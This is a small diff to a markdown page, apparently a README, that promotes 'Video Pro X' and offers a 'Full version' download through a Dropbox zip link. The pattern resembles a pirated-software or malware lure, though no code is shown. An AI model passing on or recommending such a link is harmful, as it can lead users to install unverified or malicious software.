@@ -16,7 +16,7 @@
 * Video Pro X has always stood for technological innovation above and beyond industry standard. 
 * Discover resolutions in up to 8K UltraHD, HDR color space and latest film studio effects, and achieve professional results. The powerful video engine means that video editing is absolutely smooth, even for complex multi-track projects.
 
-## [Download Video Pro X [Full version](https://www.dropbox.com/s/563fgau7pi89013/Video%20Pro%20X.zip?dl=1):
+## Download Video Pro X [Full version](https://www.dropbox.com/s/563fgau7pi89013/Video%20Pro%20X.zip?dl=1):
 
 
 
